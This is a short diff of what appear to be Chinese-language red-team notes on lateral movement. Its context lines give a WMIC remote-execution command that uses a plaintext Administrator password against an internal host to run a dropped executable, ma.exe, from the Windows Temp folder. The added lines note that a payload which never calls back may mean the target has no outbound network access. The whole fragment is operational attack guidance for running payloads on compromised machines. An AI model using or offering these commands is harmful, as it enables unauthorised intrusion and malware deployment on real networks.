@@ -8,4 +8,6 @@
       
     VMIC远程执行 
     shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
+    
+    如果发现很久没有上线，可能目标不出网
  
